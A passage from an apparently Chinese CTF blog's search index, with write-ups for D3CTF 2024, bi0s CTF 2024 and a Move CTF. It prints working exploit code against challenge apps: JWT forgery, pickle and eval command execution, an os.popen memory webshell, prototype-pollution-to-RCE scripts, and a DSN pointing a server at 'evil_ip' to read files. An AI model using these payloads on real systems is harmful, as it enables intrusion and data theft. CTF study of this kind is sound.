model.put(\u0026#34;msg\u0026#34;, getMD5Hash(result)); } else { model.put(\u0026#34;msg\u0026#34;, \u0026#34;Render Page\u0026#34;); } return model; } 渲染过程 由renderTo进入execute函数。然后遍历所有要执行的语句然后依次执行。 每条语句的具体执行代码在org.beetl.core.statement.NativeCallExpression#evaluate函数。\npublic Object evaluate(Context ctx) { Class targetCls = null; Object targetObj = null; NativeNode lastNode = null; if (insNode !","title":"Ciscn 2024 final Fobee wp"},{"content":"Cyber Security enthusiasts / CTFer\nemail: em9pbHRpbjB4QGdtYWlsLmNvbQ==\n","permalink":"https://zoiltin.github.io/about/","summary":"Cyber Security enthusiasts / CTFer\nemail: em9pbHRpbjB4QGdtYWlsLmNvbQ==","title":"About"},{"content":"d3pythonhttp 解决，一血\njwt绕过 def get_key(kid): key = \u0026#34;\u0026#34; dir = \u0026#34;/app/\u0026#34; try: with open(dir+kid, \u0026#34;r\u0026#34;) as f: key = f.read() except: pass print(key) return key def verify_token(token): header = jwt.get_unverified_header(token) kid = header[\u0026#34;kid\u0026#34;] key = get_key(kid) try: payload = jwt.decode(token, key, algorithms=[\u0026#34;HS256\u0026#34;]) return True except: return False 验证jwt时kid控制密钥文件路径，如果设置的密钥文件不存在，则key为空，所以构造空秘钥以及一个不存在的文件即可：\nprint(jwt.encode({\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;isadmin\u0026#34;:true}, key, algorithm=\u0026#34;HS256\u0026#34;, headers={\u0026#34;kid\u0026#34;: \u0026#34;frontend_keyasdasd\u0026#34;})) # eyJhbGciOiJIUzI1NiIsImtpZCI6ImZyb250ZW5kX2tleWFzZGFzZCIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNhZG1pbiI6dHJ1ZX0.LmTEt2GD0-nVv-yvf7Dc0lNAlQqBj9FYBb932_UWO6M 解析差异 一种做法是TE-CL请求走私。不过我用的是另一种办法：前端使用Flask，后端使用web.py存在解析差异。 经测试发现：前段对于chunked不分大小写，后端会区分。前端只进行分块传输，忽略Content-Length。而后端会先分块，再根据Content-Length截取，前端会把Content-Length直接发送给后端。\nheaders = {key: value for (key, value) in request.headers if key != \u0026#39;Host\u0026#39;} 除了Host以外的header都发往后端了包括Content-Length，且前端不进行计算验证。 数据包：\nPOST /admin HTTP/1.1 Host: 192.168.72.137:8081 Content-Length: 192 Cookie: token=eyJhbGciOiJIUzI1NiIsImtpZCI6ImZyb250ZW5kX2tleWFzZGFzZCIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNhZG1pbiI6dHJ1ZX0.LmTEt2GD0-nVv-yvf7Dc0lNAlQqBj9FYBb932_UWO6M Transfer-Encoding: chunKed dc \u0026lt;base64payload...长度为192\u0026gt;BackdoorPasswordOnlyForAdmin 0 后端只读取前192个字符，后面的BackdoorPasswordOnlyForAdmin被舍弃。绕过。 base64解码后pickle反序列化。\nimport pickle import os import base64 payload = \u0026#34;\u0026#34;\u0026#34; print(1) \u0026#34;\u0026#34;\u0026#34; class test: def __reduce__(self): return (exec,(payload,)) a = test() b = base64.b64encode(pickle.dumps(a)) print(b) 突破内网 题目不出网，可以试试整个类似内存马的东西（从dubhe ctf 2024中学到的）。 后端存在以下路由：\nurls = ( \u0026#39;/\u0026#39;, \u0026#39;index\u0026#39;, \u0026#39;/backdoor\u0026#39;, \u0026#39;backdoor\u0026#39; ) web.config.debug = False app = web.application(urls, globals()) class index: def GET(self): return \u0026#34;welcome to the backend!\u0026#34; 对应前端代码：\n@app.route(\u0026#39;/backend\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def proxy_to_backend(): forward_url = \u0026#34;python-backend:8080\u0026#34; conn = http.client.HTTPConnection(forward_url) method = request.method headers = {key: value for (key, value) in request.headers if key != \u0026#34;Host\u0026#34;} data = request.data path = \u0026#34;/\u0026#34; if request.query_string: path += \u0026#34;?\u0026#34; + request.query_string.decode() conn.request(method, path, body=data, headers=headers) response = conn.getresponse() return response.read() response = conn.getresponse() 这段代码意味着后端处理的数据后会回显到前端，而/backdoor路由不会，所以我们可以将后端index路由覆盖为内存马。 使用exec函数执行以下python代码就可以将index路由的GET方法覆盖(asd参数要保留，因为服务器调用的时候会传一个self参数)：\ndef test(asd): return \u0026#34;pwned\u0026#34; index.GET = test 访问index路由是可以带get参数：\nif request.query_string: path += \u0026#34;?\u0026#34; + request.query_string.decode() 所以内存马实现如下：\ndef test(asd): cmd = web.input().cmd return __import__(\u0026#39;os\u0026#39;).popen(cmd).read() index.GET = test stack_overflow 解决，一血\n题目用nodejs模拟了一个栈溢出。 关键代码：\nlet respond = {} let stack = [] let getStack = function (address) { if (address - pie \u0026gt;= 0 \u0026amp;\u0026amp; address - pie \u0026lt; 0x10000) return stack[address - pie] return 0 } let getIndex = function (address) { return address - pie } let read = function (fd, buf, count) { let ori = req.body[fd] if (ori.length \u0026lt; count) { count = ori.length } if (typeof ori !== \u0026#34;string\u0026#34; \u0026amp;\u0026amp; !Array.isArray(ori)) return res.json({\u0026#34;err\u0026#34;: \u0026#34;hack!\u0026#34;}) for (let i = 0; i \u0026lt; count; i++){ if (waf(ori[i])) return res.json({\u0026#34;err\u0026#34;: \u0026#34;hack!\u0026#34;}) stack[getIndex(buf) + i] = ori[i] } } let write = function (fd, buf, count) { if (!respond.hasOwnProperty(fd)) { respond[fd] = [] } for (let i = 0; i \u0026lt; count; i++){ respond[fd].push(getStack(buf + i)) } } let run = function (address) { let continuing = 1; while (continuing) { switch (getStack(address)) { case \u0026#34;read\u0026#34;: let r_fd = stack.pop() let read_addr = stack.pop() if (read_addr.startsWith(\u0026#34;{{\u0026#34;) \u0026amp;\u0026amp; read_addr.endsWith(\u0026#34;}}\u0026#34;)) { read_addr = pie + eval(read_addr.slice(2,-2).replace(\u0026#34;stack\u0026#34;, (stack.length - 1).toString())) } read(r_fd, parseInt(read_addr), parseInt(stack.pop())) break; case \u0026#34;write\u0026#34;: let w_fd = stack.pop() let write_addr = stack.pop() if (write_addr.startsWith(\u0026#34;{{\u0026#34;) \u0026amp;\u0026amp; write_addr.endsWith(\u0026#34;}}\u0026#34;)) { write_addr = pie + eval(write_addr.slice(2,-2).replace(\u0026#34;stack\u0026#34;, (stack.length - 1).toString())) } write(w_fd, parseInt(write_addr), parseInt(stack.pop())) break; case \u0026#34;exit\u0026#34;: continuing = 0; break; case \u0026#34;call_interface\u0026#34;: let numOfArgs = stack.pop() let cmd = stack.pop() let args = [] for (let i = 0; i \u0026lt; numOfArgs; i++) { args.push(stack.pop()) } cmd += \u0026#34;(\u0026#39;\u0026#34; + args.join(\u0026#34;\u0026#39;,\u0026#39;\u0026#34;) + \u0026#34;\u0026#39;)\u0026#34; let result = vm.runInNewContext(cmd) stack.push(result.toString()) break; case \u0026#34;push\u0026#34;: let numOfElem = stack.pop() let elemAddr = parseInt(stack.pop()) for (let i = 0; i \u0026lt; numOfElem; i++) { stack.push(getStack(elemAddr + i)) } break; default: stack.push(getStack(address)) break; } address += 1 } } let code = `0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 28 [[ 0 ]] stdin read Started Convertion... Your input is: 2 [[short - 3]] stdout write 5 [[ 0 ]] stdout write ... 1 [[short - 2]] stdout write [[ 0 ]] 5 push (function (...a){ return a.map(char=\u0026gt;char.charCodeAt(0)).join(\u0026#39; \u0026#39;);}) 5 call_interface Ascii is: 1 [[short - 2]] result write 1 {{ stack - 2 }} result write Ascii is: 1 [[short - 2]] stdout write 1 {{ stack - 3 }} stdout write ok 1 [[short - 2]] status write exit` code = code.split(\u0026#39;\\n\u0026#39;); for (let i = 0; i \u0026lt; code.length; i++){ stack.push(code[i]) if (stack[i].startsWith(\u0026#34;[[\u0026#34;) \u0026amp;\u0026amp; stack[i].endsWith(\u0026#34;]]\u0026#34;)) { stack[i] = (pie + eval(stack[i].slice(2,-2).replace(\u0026#34;short\u0026#34;, i.toString()))).toString() } } run(pie + 0) return res.json(respond) 首先第一步操作read，从stdin读取，地址为[[ 0 ]] =\u0026gt; pie，最大读取长度为28。但是code初始只给了20个0空位，也就是说如果读入28个，正好会把第二个操作write的读取地址覆盖，也就是可以控制write函数的读取地址。 waf过滤不全：\nfunction waf(str) { let pattern = /(call_interface)|\\{\\{.*?\\}\\}/g; return str.match(pattern) } 仔细看write函数，如果地址以{{开头，}}结尾，会将中间的数据传给eval函数而正则表达式.*不能匹配换行，所以可以直接使用{{\\nrequire('child_process').exec('id')}}执行命令。read函数可以是字符串也可以是数组，所以可以传此地址。第28位为要执行的命令，27位为传入的数据的长度，写28。\n{\u0026#34;stdin\u0026#34;:[\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;28\u0026#34;,\u0026#34;{{\\nrequire(\u0026#39;child_process\u0026#39;).exec(\u0026#39;ls / \u0026gt; /app/index.html\u0026#39;)}}\u0026#34;]} 题目环境有个奇怪的地方，本地环境需要/readflag，直接读flag读不出来，但远程环境/readflag读不出来，直接读flag却可以了，dockerfile里的root用户密码也没用上，感觉怪怪的。\nmoonbox 解决\n题目给了个moonbox的后台，flag在moonbox-server容器内。 官方的流程图（录制模式） moonbox有自定义agent的功能，官方文档：\n已修改moonbox-agent 如修改过moonbox-agent代码，那么需要把修改过的agent代码重新打包。打包步骤如下 step1：maven打包(可选) 执行 mvn clean install操作 step2：打包moonbox-agent 执行打包命令，命令路径为 /moonbox-agent/moonbox-java-agent/bin sh ./install-local-agent.sh step3：agent包上传 moonbox-agent “文件更新”上传包，可以选择step2打包生成的 agengt文件即可。\n根据流程，我们可以修改agent能够在JVM所在机器中执行任意shell脚本。 不过呢，使用mvn打包的话容易报错，直接在.sandbox-module/bin/start-remote-agent.sh中写入反弹shell的命令。然后打包上传即可（moonbox-agent）。 目录结构：\n.sandbox-module/ bin/ install-local-agent.sh start-remote-agent.sh 正常版本在local-agent目录下，可以参考着改。\n有个坑，nginx不允许传大文件，可以把除shell脚本以外的文件删除，不影响执行。 连接JVM机器需要ssh连接，而容器ssh为弱口令root:123456，配置好录制流量即可执行shell脚本。\nDoctor 未解决\n默认密码和jwt key都改了。\nwebsocket可以绕过部分jwt限制。 对于recoder的验证，如果是websocket直接通过。\nfunc SuperRecorderGroup() yee.HandlerFunc { return func(c yee.Context) (err error) { if c.IsWebsocket() { return nil } role := new(lib.Token).JwtParse(c) if role.IsRecord { return } return c.ServerError(http.StatusForbidden, \u0026#34;非法越权操作！\u0026#34;) } } 对于jwt也是\nreturn func(c yee.Context) (err error) { // cause upgrade websocket will clear custom header // when header add jwt bearer that panic if c.IsWebsocket() { return } 但是没有SuperManageGroup权限。只能获得普通用户权限。\n然后就卡住了~~\n赛后复现 越权之后可以访问GET /api/v2/fetch/fields\nfunc FetchTableInfo(c yee.Context) (err error) { u := new(_FetchBind) if err = c.Bind(u); err != nil { c.Logger().Error(err.Error()) return c.JSON(http.StatusOK, common.ERR_REQ_BIND) } if u.DataBase != \u0026#34;\u0026#34; \u0026amp;\u0026amp; u.Table != \u0026#34;\u0026#34; { if err := u.FetchTableFieldsOrIndexes(); err != nil { c.Logger().Critical(err.Error()) } return c.JSON(http.StatusOK, common.SuccessPayload(map[string]interface{}{\u0026#34;rows\u0026#34;: u.Rows, \u0026#34;idx\u0026#34;: u.Idx})) } return c.JSON(http.StatusOK, common.ERR_COMMON_MESSAGE(errors.New(i18n.DefaultLang.Load(i18n.INFO_LIBRARY_NAME_TABLE_NAME)))) } 调用FetchTableFieldsOrIndexes函数：\nfunc (u *_FetchBind) FetchTableFieldsOrIndexes() error { var s model.CoreDataSource model.DB().Where(\u0026#34;source_id =?\u0026#34;, u.SourceId).First(\u0026amp;s) ps := lib.Decrypt(model.JWT, s.Password) db, err := model.NewDBSub(model.DSN{ Username: s.Username, Password: ps, Host: s.IP, Port: s.Port, DBName: u.DataBase, CA: s.CAFile, Cert: s.Cert, Key: s.KeyFile, }) if err != nil { return err } defer model.Close(db) if err := db.Raw(fmt.Sprintf(\u0026#34;SHOW FULL FIELDS FROM `%s`.`%s`\u0026#34;, u.DataBase, u.Table)).Scan(\u0026amp;u.Rows).Error; err != nil { return err } if err := db.Raw(fmt.Sprintf(\u0026#34;SHOW INDEX FROM `%s`.`%s`\u0026#34;, u.DataBase, u.Table)).Scan(\u0026amp;u.Idx).Error; err != nil { return err } return nil } 此时数据库中没有DataSource数据，所以s为空，所以后面的DSN中只有DBName可控。 model.NewDBSub：\nfunc NewDBSub(dsn DSN) (*gorm.DB, error) { d, err := InitDSN(dsn) if err != nil { return nil, err } db, err := gorm.Open(drive.New(drive.Config{ DSN: d, DefaultStringSize: 256, // string 类型字段的默认长度 SkipInitializeWithVersion: false, // 根据当前 MySQL 版本自动配置 }), \u0026amp;gorm.Config{}) if err != nil { return nil, err } return db, nil } InitDSN会将dsn序列化。 InitDSN：\nfunc InitDSN(dsn DSN) (string, error) { isTLS := false if dsn.CA != \u0026#34;\u0026#34; \u0026amp;\u0026amp; dsn.Cert != \u0026#34;\u0026#34; \u0026amp;\u0026amp; dsn.Key != \u0026#34;\u0026#34; { isTLS = true certPool := x509.NewCertPool() if ok := certPool.AppendCertsFromPEM([]byte(dsn.CA)); !ok { return \u0026#34;\u0026#34;, fmt.Errorf(\u0026#34;failed to append ca certs\u0026#34;) } clientCert := make([]tls.Certificate, 0, 1) certs, err := tls.X509KeyPair([]byte(dsn.Cert), []byte(dsn.Key)) if err != nil { return \u0026#34;\u0026#34;, err } clientCert = append(clientCert, certs) _ = mmsql.RegisterTLSConfig(\u0026#34;custom\u0026#34;, \u0026amp;tls.Config{ RootCAs: certPool, Certificates: clientCert, InsecureSkipVerify: true, }) } cfg := mmsql.Config{ User: dsn.Username, Passwd: dsn.Password, Addr: fmt.Sprintf(\u0026#34;%s:%d\u0026#34;, dsn.Host, dsn.Port), //IP:PORT Net: \u0026#34;tcp\u0026#34;, DBName: dsn.DBName, Loc: time.Local, AllowNativePasswords: true, ParseTime: true, } if isTLS == true { cfg.TLSConfig = \u0026#34;custom\u0026#34; } return cfg.FormatDSN(), nil } cfg中依然只有DBName可控。 cfg.FormatDSN()：\nfunc (cfg *Config) FormatDSN() string { var buf bytes.Buffer // [username[:password]@] if len(cfg.User) \u0026gt; 0 { buf.WriteString(cfg.User) if len(cfg.Passwd) \u0026gt; 0 { buf.WriteByte(\u0026#39;:\u0026#39;) buf.WriteString(cfg.Passwd) } buf.WriteByte(\u0026#39;@\u0026#39;) } // [protocol[(address)]] if len(cfg.Net) \u0026gt; 0 { buf.WriteString(cfg.Net) if len(cfg.Addr) \u0026gt; 0 { buf.WriteByte(\u0026#39;(\u0026#39;) buf.WriteString(cfg.Addr) buf.WriteByte(\u0026#39;)\u0026#39;) } } // /dbname buf.WriteByte(\u0026#39;/\u0026#39;) buf.WriteString(cfg.DBName) // [?param1=value1\u0026amp;...\u0026amp;paramN=valueN] hasParam := false if cfg.AllowAllFiles { hasParam = true buf.WriteString(\u0026#34;?allowAllFiles=true\u0026#34;) } 生成DSN：user:pass@tcp(address:port)/dbname?param=asd，其中dbname可控。 解析DSN时从后往前找斜杠：\nfunc ParseDSN(dsn string) (cfg *Config, err error) { // New config with some default values cfg = NewConfig() // [user[:password]@][net[(addr)]]/dbname[?param1=value1\u0026amp;paramN=valueN] // Find the last \u0026#39;/\u0026#39; (since the password or the net addr might contain a \u0026#39;/\u0026#39;) 所以设置dbname为user:pass@tcp(evil_ip:port)/test?allowAllFiles=true\u0026amp;可以使服务器连接恶意mysql服务器，前面的原始的address就被忽略了，开启allowAllFiles可以读取文件。\n","permalink":"https://zoiltin.github.io/posts/d3ctf-2024-web-wp/","summary":"d3pythonhttp 解决，一血\njwt绕过 def get_key(kid): key = \u0026#34;\u0026#34; dir = \u0026#34;/app/\u0026#34; try: with open(dir+kid, \u0026#34;r\u0026#34;) as f: key = f.read() except: pass print(key) return key def verify_token(token): header = jwt.get_unverified_header(token) kid = header[\u0026#34;kid\u0026#34;] key = get_key(kid) try: payload = jwt.decode(token, key, algorithms=[\u0026#34;HS256\u0026#34;]) return True except: return False 验证jwt时kid控制密钥文件路径，如果设置的密钥文件不存在，则key为空，所以构造空秘钥以及一个不存在的文件即可：\nprint(jwt.encode({\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;isadmin\u0026#34;:true}, key, algorithm=\u0026#34;HS256\u0026#34;, headers={\u0026#34;kid\u0026#34;: \u0026#34;frontend_keyasdasd\u0026#34;})) # eyJhbGciOiJIUzI1NiIsImtpZCI6ImZyb250ZW5kX2tleWFzZGFzZCIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNhZG1pbiI6dHJ1ZX0.LmTEt2GD0-nVv-yvf7Dc0lNAlQqBj9FYBb932_UWO6M 解析差异 一种做法是TE-CL请求走私。不过我用的是另一种办法：前端使用Flask，后端使用web.py存在解析差异。 经测试发现：前段对于chunked不分大小写，后端会区分。前端只进行分块传输，忽略Content-Length。而后端会先分块，再根据Content-Length截取，前端会把Content-Length直接发送给后端。\nheaders = {key: value for (key, value) in request.headers if key != \u0026#39;Host\u0026#39;} 除了Host以外的header都发往后端了包括Content-Length，且前端不进行计算验证。 数据包：","title":"d3ctf-2024-web-wp"},{"content":"required note 用npm audit搜索历史漏洞。发现一个原型链污染的漏洞。 POC:\nconst protobuf = require(\u0026#34;protobufjs\u0026#34;); protobuf.parse(\u0026#39;option(a).constructor.prototype.verified = true;\u0026#39;); console.log({}.verified); // returns true /create会进行protojs解析。\napp.post(\u0026#39;/create\u0026#39;, (req, res) =\u0026gt; { requestBody=req.body try{ schema = fs.readFileSync(\u0026#39;./settings.proto\u0026#39;, \u0026#39;utf-8\u0026#39;); root = protobuf.parse(schema).root; Note = root.lookupType(\u0026#39;Note\u0026#39;); [...] 在/customise可以修改settings.proto文件。\napp.post(\u0026#39;/customise\u0026#39;,(req, res) =\u0026gt; { try { const { data } = req.body; let author = data.pop()[\u0026#39;author\u0026#39;]; let title = data.pop()[\u0026#39;title\u0026#39;]; let protoContents = fs.readFileSync(\u0026#39;./settings.proto\u0026#39;, \u0026#39;utf-8\u0026#39;).split(\u0026#39;\\n\u0026#39;); if (author) { protoContents[5] = ` ${author} string author = 3 [default=\u0026#34;user\u0026#34;];`; } if (title) { protoContents[3] = ` ${title} string title = 1 [default=\u0026#34;user\u0026#34;];`; } fs.writeFileSync(\u0026#39;./settings.proto\u0026#39;, protoContents.join(\u0026#39;\\n\u0026#39;), \u0026#39;utf-8\u0026#39;); return res.json({ Message: \u0026#39;Settings changed\u0026#39; }); } catch (error) { console.error(error); res.status(500).json({ Message: \u0026#39;Internal server error\u0026#39; }); } }) 解题思路（非预期）是通过原型链污染到ejs render渲染rce。ejs利用链参考：https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce\nPOC：\nimport requests base_url = \u0026#39;http://192.168.72.137:3000\u0026#39; payloads = [ \u0026#39;option(a).constructor.prototype.client = 1;\u0026#39;.strip(), \u0026#39;option(a).constructor.prototype.escapeFunction = \u0026#34;JSON.stringify; process.mainModule.require(\\\u0026#39;child_process\\\u0026#39;).exec(\\\u0026#39;touch /tmp/poc\\\u0026#39;)\u0026#34;;\u0026#39;.strip() ] for i in payloads: # 写入settings.proto sp = requests.post(url=base_url+\u0026#39;/customise\u0026#39;,json={ \u0026#34;data\u0026#34; : [ {\u0026#34;title\u0026#34; : \u0026#34;optional\u0026#34;}, {\u0026#34;author\u0026#34; : i + \u0026#34;optional\u0026#34;} ] }) # 污染 sp = requests.post(url=base_url+\u0026#39;/create\u0026#39;,json={\u0026#34;test\u0026#34; : \u0026#34;test\u0026#34;}) sp = requests.get(url=base_url+\u0026#39;/customise\u0026#39;) # 执行render渲染达成rce 这个解法根本用不到bot\n踩坑 在原型链污染的时候会报如下错误： 有一种无法污染的假象，其实通过debug可以发现，虽然报错了但污染也成功了。\n对Dockerfile做下修改 npm install挂代理，修改部分目录权限(方便vscode ssh链接，尤其是不是root用户的情况下)，最主要的是注释掉node index.js：\nFROM node:20.2.0-alpine RUN apk update \u0026amp;\u0026amp; apk upgrade RUN apk add chromium WORKDIR /app COPY . /app/ RUN mkdir -p /app/notes RUN npm config set proxy=socks5://192.168.136.1:7890 \u0026amp;\u0026amp; PUPPETEER_SKIP_CHROMIUM_DOWNLOAD=1 npm install \u0026amp;\u0026amp; npm config delete proxy RUN chmod +x /app/index.js RUN rm *.json RUN adduser -D -u 1001 bot \u0026amp;\u0026amp; chown -R bot:bot /app/notes \u0026amp;\u0026amp; chown bot:bot /app/settings.proto \u0026amp;\u0026amp; chmod 777 -R /app \u0026amp;\u0026amp; chmod 777 -R /home/bot USER bot ENV PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser #ENTRYPOINT [\u0026#34;node\u0026#34;, \u0026#34;index.js\u0026#34;] docker run -it -p 3000:3000 \u0026lt;image-id\u0026gt; 然后使用vscode连接容器ssh。参考：https://www.cnblogs.com/booturbo/p/16323439.html 启动debug 在执行render时打断点，发现已经污染成功。 其他的RCE利用方式 第一种 作者原文：https://hackmd.io/@r2dev2/Hkj7IhP3T hacktrick上有许多污染child_process相关变量进行rce的方法：https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce\n通过spawn函数和cmdline的poc：\n// cmdline trick - working with small variation (shell) // NOT working after kEmptyObject (fix) without options const { spawn } = require(\u0026#39;child_process\u0026#39;); p = {} p.__proto__.shell = \u0026#34;/proc/self/exe\u0026#34; //You need to make sure the node executable is executed p.__proto__.argv0 = \u0026#34;console.log(require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;touch /tmp/spawn-cmdline\u0026#39;).toString())//\u0026#34; p.__proto__.NODE_OPTIONS = \u0026#34;--require /proc/self/cmdline\u0026#34; var proc = spawn(\u0026#39;something\u0026#39;); //var proc = spawn(\u0026#39;something\u0026#39;,[],{\u0026#34;cwd\u0026#34;:\u0026#34;/tmp\u0026#34;}); //To work after kEmptyObject (fix) 而且bot通过puppeteer启动chrome浏览器时会调用spawn函数。从而实现rce。 这种方法在revenge上不能用。\n第二种 作者原文：https://gist.github.com/arkark/4a70a2df20da9732979a80a83ea211e2 这里的POC revenge和non-revenge均可。\n泄露flagid的解法 作者原文：https://siunam321.github.io/ctf/bi0sCTF-2024/Web-Exploitation/required-notes/ /search搜索note时使用了glob，glob协议可以使用通配符，有利用的可能。\napp.get(\u0026#39;/search/:noteId\u0026#39;, (req, res) =\u0026gt; { const noteId = req.params.noteId; const notes=glob.sync(`./notes/${noteId}*`); if(notes.length === 0){ return res.json({Message: \u0026#34;Not found\u0026#34;}); } else{ try{ fs.accessSync(`./notes/${noteId}.json`); return res.json({Message: \u0026#34;Note found\u0026#34;}); } catch(err){ return res.status(500).json({ Message: \u0026#39;Internal server error\u0026#39; }); } } }) 通过noteId可以一位一位地获取flagid，但是app.use('/search', restrictToLocalhost);限制了/search的访问IP。\nconst restrictToLocalhost = (req, res, next) =\u0026gt; { const remoteAddress = req.connection.remoteAddress; if (remoteAddress === \u0026#39;::1\u0026#39; || remoteAddress === \u0026#39;127.0.0.1\u0026#39; || remoteAddress === \u0026#39;::ffff:127.0.0.1\u0026#39;) { next(); } else { res.status(403).json({ Message: \u0026#39;Access denied\u0026#39; }); } }; 所以我们只要将remoteAddress污染为127.0.0.1就可以了。\n踩坑 地址修改不成功 原因是获取req.connection中的remoteAddress不是直接获取的。 所以我们需要修改address。还有一个问题是在调用remoteAddress之前_peername不会实例化，导致污染无效。 req.connection._getpeername()代码如下：\nfunction() { if (!this._handle || !this._handle.getpeername || this.connecting) { return this._peername || {}; } else if (!this._peername) { const out = {}; const err = this._handle.getpeername(out); if (err) return out; this._peername = out; } return this._peername; } 正常情况下会进入else if因为发起请求时_peername尚未实例化，然后通过getpeername(out)给_peername赋值，污染就无效了。 但如果一开始污染_peername，使_peername一开始就有值，就不会进入else if，直接return被污染的_peername。 POC:\nimport requests base_url = \u0026#39;http://192.168.72.137:3000\u0026#39; flagid = \u0026#39;\u0026#39; characters = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789\u0026#39; pollu = \u0026#39;option(a).constructor.prototype._peername.address = \u0026#34;127.0.0.1\u0026#34;;\u0026#39;.strip() sp = requests.post(base_url+\u0026#39;/customise\u0026#39;,json={ \u0026#34;data\u0026#34; : [ {\u0026#34;title\u0026#34; : \u0026#34;optional\u0026#34;}, {\u0026#34;author\u0026#34; : pollu + \u0026#34;optional\u0026#34;} ] }) sp = requests.post(base_url+\u0026#39;/create\u0026#39;,json={\u0026#34;asd\u0026#34; : \u0026#34;asd\u0026#34;}) for i in range(16): for l in characters: noteid = flagid + l print(noteid,end=\u0026#39;\\r\u0026#39;) sp = requests.get(base_url+\u0026#39;/search/\u0026#39;+noteid) if \u0026#39;Not found\u0026#39; in sp.text: continue elif \u0026#39;Internal server error\u0026#39; in sp.text: flagid = flagid + l break elif \u0026#39;Note found\u0026#39; in sp.text: flagid = flagid + l print(\u0026#34;flagid : \u0026#34;+flagid) exit() flagid = flagid + \u0026#39;_\u0026#39; print(\u0026#34;flagid : \u0026#34;+flagid) 预期解 预期是通过原型链污染让bot访问时注入恶意html标签去泄露flagid。POC:https://gist.github.com/Ze-Pacifist/9bcd1072a62bbc5850322878b21bc8c8 之前提到/search使用了glob，预期解是通过原型链污染造成html注入使bot访问/search枚举flagid的每一位。bot禁用了js，所以只能注入html标签打xsleak了。\nvarietynote 参考 https://www.code-intelligence.com/blog/cve-protobufjs-prototype-pollution-cve-2023-36665 https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce https://hackmd.io/@r2dev2/Hkj7IhP3T https://gist.github.com/Ze-Pacifist/9bcd1072a62bbc5850322878b21bc8c8 https://gist.github.com/arkark/4a70a2df20da9732979a80a83ea211e2\n","permalink":"https://zoiltin.github.io/posts/bi0s-ctf-2024-wp/","summary":"required note 用npm audit搜索历史漏洞。发现一个原型链污染的漏洞。 POC:\nconst protobuf = require(\u0026#34;protobufjs\u0026#34;); protobuf.parse(\u0026#39;option(a).constructor.prototype.verified = true;\u0026#39;); console.log({}.verified); // returns true /create会进行protojs解析。\napp.post(\u0026#39;/create\u0026#39;, (req, res) =\u0026gt; { requestBody=req.body try{ schema = fs.readFileSync(\u0026#39;./settings.proto\u0026#39;, \u0026#39;utf-8\u0026#39;); root = protobuf.parse(schema).root; Note = root.lookupType(\u0026#39;Note\u0026#39;); [...] 在/customise可以修改settings.proto文件。\napp.post(\u0026#39;/customise\u0026#39;,(req, res) =\u0026gt; { try { const { data } = req.body; let author = data.pop()[\u0026#39;author\u0026#39;]; let title = data.pop()[\u0026#39;title\u0026#39;]; let protoContents = fs.readFileSync(\u0026#39;./settings.proto\u0026#39;, \u0026#39;utf-8\u0026#39;).split(\u0026#39;\\n\u0026#39;); if (author) { protoContents[5] = ` ${author} string author = 3 [default=\u0026#34;user\u0026#34;];`; } if (title) { protoContents[3] = ` ${title} string title = 1 [default=\u0026#34;user\u0026#34;];`; } fs.","title":"bi0s CTF 2024 wp"},{"content":"Checkin sorce:100\n题目源码:\nmodule movectf::checkin { use sui::event; use sui::tx_context::{Self, TxContext}; const ESTRING:u64 = 0; struct Flag has copy, drop { sender: address, flag: bool, } public entry fun get_flag(string: vector\u0026lt;u8\u0026gt;, ctx: \u0026amp;mut TxContext) { assert!(string == b\u0026#34;MoveBitCTF\u0026#34;,ESTRING); event::emit(Flag { sender: tx_context::sender(ctx), flag: true, }); } } 带着MoveBitCTF字符串作为参数调用get_flag函数。传参要用字节。\n# 转换为十六进制 print(\u0026#34;0x\u0026#34;) for i in \u0026#34;MoveBitCTF\u0026#34;: print(hex(ord(i)).replace(\u0026#34;0x\u0026#34;,\u0026#34;\u0026#34;),end=\u0026#34;\u0026#34;) 调用即可：\nsui client call --package package_id --module module_name --function get_flag --args 0x4d6f7665426974435446 --gas-budget 10000000 DynamicMatrixTraversal sorce: 200\n关键代码\npublic entry fun execute(record: \u0026amp;mut Record, m: u64, n: u64) { if (record.count_1 == 0) { let result: u64 = up(m, n); assert!(result == TARGET_VALUE_1, ERROR_RESULT_1); record.count_1 = m; record.count_2 = n; } else if (record.count_3 == 0) { let result: u64 = up(m, n); assert!(result == TARGET_VALUE_2, ERROR_RESULT_2); record.count_3 = m; record.count_4 = n; } } public entry fun get_flag(record: \u0026amp;Record, ctx: \u0026amp;mut TxContext) { assert!(record.count_1 \u0026lt; record.count_3, ERROR_PARAM_1); assert!(record.count_2 \u0026gt; record.count_4, ERROR_PARAM_2); event::emit(Flag { user: tx_context::sender(ctx), flag: true }); } 得到flag的条件是count_1 \u0026lt; count_3且count_2 \u0026gt; 